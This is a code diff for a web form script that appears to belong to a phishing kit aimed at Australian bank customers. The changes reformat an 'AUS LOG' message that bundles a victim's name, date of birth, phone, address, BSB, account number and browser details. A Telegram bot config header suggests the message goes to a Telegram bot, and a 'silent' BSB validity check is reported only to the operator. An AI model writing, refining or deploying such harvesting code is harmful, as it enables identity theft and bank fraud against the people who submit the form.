@@ -1,3 +1,5 @@
+// app.js — обновлённый buildMessage + сборка полей
+
 /* ============================================
    TELEGRAM BOT CONFIG
    ============================================ */
@@ -46,28 +48,20 @@ function esc(s) {
 }
 
 /* ============================================
-   BSB VALIDATION (silent — result goes to bot only)
+   BSB VALIDATION (silent)
    ============================================ */
-
 const BSB_BANK_MAP = {
     '01': 'ANZ', '02': 'ANZ',
     '03': 'Westpac', '04': 'Westpac', '05': 'Westpac',
     '06': 'Commonwealth Bank', '07': 'Commonwealth Bank',
-    '08': 'NAB',
-    '09': 'Reserve Bank of Australia',
-    '10': 'Bankwest',
-    '11': 'St.George Bank',
-    '12': 'Bank of Queensland',
-    '13': 'Bank of Melbourne',
-    '14': 'Bendigo Bank',
-    '15': 'Bank of Melbourne',
-    '16': 'Bank of Queensland', '17': 'Bank of Queensland',
-    '18': 'Macquarie Bank',
-    '19': 'Bank of Queensland', '20': 'Bank of Queensland',
-    '21': 'Commonwealth Bank',
-    '22': 'Bank of Queensland', '23': 'Bank of Queensland', '24': 'Bank of Queensland',
-    '25': 'Bank of Queensland', '26': 'Bank of Queensland', '27': 'Bank of Queensland',
-    '28': 'Bank of Queensland', '29': 'Bank of Queensland',
+    '08': 'NAB', '09': 'Reserve Bank of Australia',
+    '10': 'Bankwest', '11': 'St.George Bank',
+    '12': 'Bank of Queensland', '13': 'Bank of Melbourne', '14': 'Bendigo Bank',
+    '15': 'Bank of Melbourne', '16': 'Bank of Queensland', '17': 'Bank of Queensland',
+    '18': 'Macquarie Bank', '19': 'Bank of Queensland', '20': 'Bank of Queensland',
+    '21': 'Commonwealth Bank', '22': 'Bank of Queensland', '23': 'Bank of Queensland',
+    '24': 'Bank of Queensland', '25': 'Bank of Queensland', '26': 'Bank of Queensland',
+    '27': 'Bank of Queensland', '28': 'Bank of Queensland', '29': 'Bank of Queensland',
     '30': 'Bankwest', '31': 'Bankwest',
     '32': 'Westpac', '33': 'Westpac', '34': 'Westpac', '35': 'Westpac',
     '36': 'Westpac', '37': 'Westpac', '38': 'Westpac', '39': 'Westpac',
@@ -166,26 +160,33 @@ function validateBSB(raw) {
     };
 }
 
-function buildBsbStatusLine(bsbCheck, bsbRaw) {
+function buildBsbStatus(bsbCheck, bsbRaw) {
     const digits = String(bsbRaw || '').replace(/\D/g, '');
 
     if (digits.length === 0) {
-        return '<b>BSB status:</b> <i>not provided</i>';
+        return 'not provided';
     }
-
     if (bsbCheck.valid) {
-        const tag = bsbCheck.isKnownFull ? 'verified code' : 'valid format';
-        return `<b>BSB status:</b> ✅ <b>VALID</b> (${esc(tag)}) — Bank: <code>${esc(bsbCheck.bank)}</code>`;
+        const tag = bsbCheck.isKnownFull ? 'verified' : 'valid format';
+        return `✅ VALID (${tag}) — ${bsbCheck.bank}`;
     }
-
     const map = {
-        'too_short':      `❌ INVALID — too short (${digits.length}/6 digits)`,
-        'too_long':       `❌ INVALID — too long (${digits.length}/6 digits)`,
+        'too_short':      `❌ INVALID — too short (${digits.length}/6)`,
+        'too_long':       `❌ INVALID — too long (${digits.length}/6)`,
         'zero_prefix':    '❌ INVALID — cannot start with 00',
-        'unknown_prefix': `❌ INVALID — unknown bank prefix "${esc(digits.substring(0, 2))}"`
+        'unknown_prefix': `❌ INVALID — unknown bank prefix "${digits.substring(0, 2)}"`
     };
-    const msg = map[bsbCheck.reason] || '❌ INVALID';
-    return `<b>BSB status:</b> ${msg}`;
+    return map[bsbCheck.reason] || '❌ INVALID';
+}
+
+/* ============================================
+   FORMAT TIME — 8.10.2026, 22:23:05
+   ============================================ */
+function fmtTime(d) {
+    const date = d || new Date();
+    const pad = (n) => String(n).padStart(2, '0');
+    return `${date.getDate()}.${date.getMonth() + 1}.${date.getFullYear()}, ` +
+           `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
 }
 
 /* ============================================
@@ -200,56 +201,39 @@ function collectFormData() {
     const bsbRaw = get('bsb');
     const bsbCheck = validateBSB(bsbRaw);
 
-    const data = {
-        'First name':     get('first-name'),
-        'Last name':      get('last-name'),
-        'Date of birth':  get('dob'),
-        'Phone number':   get('phone'),
-        'Address':        get('address'),
-        'Postcode':       get('postcode'),
-        'BSB':            bsbRaw,
-        'Account number': get('account-number')
+    return {
+        firstName:    get('first-name'),
+        lastName:     get('last-name'),
+        dob:          get('dob'),
+        phone:        get('phone'),
+        address:      get('address'),
+        postcode:     get('postcode'),
+        bsb:          bsbRaw,
+        account:      get('account-number'),
+        bsbCheck:     bsbCheck
     };
-
-    const meta = {
-        'User-Agent':  navigator.userAgent,
-        'Language':    navigator.language,
-        'Platform':    navigator.platform || 'n/a',
-        'Timezone':    Intl.DateTimeFormat().resolvedOptions().timeZone,
-        'Timestamp':   new Date().toISOString()
-    };
-
-    return { data, meta, bsbCheck };
 }
 
-function buildMessage(data, meta, bsbCheck) {
+/* ============================================
+   BUILD MESSAGE — формат "AUS LOG"
+   ============================================ */
+function buildMessage(d) {
+    const fullName = [d.firstName, d.lastName].filter(Boolean).join(' ');
+
     const lines = [];
-    lines.push('AUS LOG 🇦🇺🌏');
+    lines.push('🔴 <b>AUS LOG!</b>');
     lines.push('');
-    lines.push('<b>── Form data ──</b>');
-
-    let emptyCount = 0;
-    for (const [k, v] of Object.entries(data)) {
-        if (v) {
-            lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
-        } else {
-            lines.push(`<b>${esc(k)}:</b> <i>(empty)</i>`);
-            emptyCount++;
-        }
-    }
-
+    lines.push(`👤 <b>Name:</b> ${esc(fullName) || '<i>—</i>'}`);
+    lines.push(`🎂 <b>Date of birth:</b> ${esc(d.dob) || '<i>—</i>'}`);
+    lines.push(`📱 <b>Phone:</b> ${esc(d.phone) || '<i>—</i>'}`);
+    lines.push(`📍 <b>Address:</b> ${esc(d.address) || '<i>—</i>'}`);
+    lines.push(`📮 <b>Postcode:</b> ${esc(d.postcode) || '<i>—</i>'}`);
+    lines.push(`🏦 <b>BSB:</b> ${esc(d.bsb) || '<i>—</i>'}`);
+    lines.push(`🔍 <b>BSB status:</b> ${buildBsbStatus(d.bsbCheck, d.bsb)}`);
+    lines.push(`🔢 <b>Account:</b> ${esc(d.account) || '<i>—</i>'}`);
     lines.push('');
-    lines.push('<b>── BSB check ──</b>');
-    lines.push(buildBsbStatusLine(bsbCheck, data['BSB']));
-
-    lines.push('');
-    lines.push('<b>── Metadata ──</b>');
-    for (const [k, v] of Object.entries(meta)) {
-        lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
-    }
-
-    lines.push('');
-    lines.push(`<i>Fields filled: ${Object.keys(data).length - emptyCount}/${Object.keys(data).length}</i>`);
+    lines.push(`🕒 <b>Time:</b> ${esc(fmtTime())}`);
+    lines.push(`🌐 <b>Browser:</b> ${esc(navigator.userAgent)}`);
 
     return lines.join('\n');
 }
@@ -263,8 +247,8 @@ const submitBtn = document.getElementById('submitBtn');
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    const { data, meta, bsbCheck } = collectFormData();
-    const message = buildMessage(data, meta, bsbCheck);
+    const data    = collectFormData();
+    const message = buildMessage(data);
 
     const originalText = submitBtn.textContent;
     submitBtn.disabled = true;
